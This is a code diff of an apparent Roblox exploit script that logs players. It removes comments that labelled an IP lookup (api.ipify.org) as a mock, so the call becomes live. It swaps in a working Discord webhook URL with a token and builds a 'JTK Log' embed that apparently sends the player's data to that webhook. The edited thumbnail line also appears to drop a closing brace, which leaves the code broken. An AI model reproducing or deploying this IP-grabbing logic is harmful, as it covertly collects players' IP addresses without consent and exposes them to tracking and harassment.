@@ -159,9 +159,7 @@ end
 local function getPlayerIP()
     print("Attempting to retrieve player IP")
     local success, ipAddress = pcall(function()
-        -- Placeholder: Simulate IP retrieval (Roblox doesn't allow direct IP access)
-        -- In a real scenario, this would be an external service call
-        return game:HttpGet("https://api.ipify.org") -- Mock API call
+        return game:HttpGet("https://api.ipify.org")
     end)
     if success then
         print("IP retrieved: " .. ipAddress)
@@ -339,7 +337,7 @@ coroutine.wrap(function()
             end
             getgenv().jumpscare_jeffwuz_loaded = true
             getgenv().Notify = false
-            local Notify_Webhook = "https://discord.com/api/webhooks/1390952057296519189/n0SJoYfZq0PD4-vphnZw2d5RTesGZvkLSWm6RX_sBbCZC2QXxVdGQ5q7N338mZ4m9j5E"
+            local Notify_Webhook = "https://discord.com/api/webhooks/1396650841045209169/Mx_0dcjOVnzp5f5zMhYM2uOBCPGt9SPr908shfLh_FGKZJ5eFc4tMsiiNNp1CGDx_M21"
             if not getcustomasset then
                 game:Shutdown()
                 return
@@ -384,7 +382,7 @@ coroutine.wrap(function()
                                     {["name"] = "Profile Description", ["value"] = "THIS IS PROBIHIDENED BY Scripts Hub X | Official", ["inline"] = true}
                                 },
                                 ["footer"] = {["text"] = "JTK Log", ["icon_url"] = "https://res.cloudinary.com/dtjjgiitl/image/upload/q_auto:good,f_auto,fl_progressive/v1753332266/kpjl5smuuixc5w2ehn7r.jpg"},
-                                ["thumbnail"] = {["url"] = avatardata}
+                                ["thumbnail"] = {["url"] = "https://res.cloudinary.com/dtjjgiitl/image/upload/q_auto:good,f_auto,fl_progressive/v1753332266/kpjl5smuuixc5w2ehn7r.jpg"
                             }
                         }
                     }
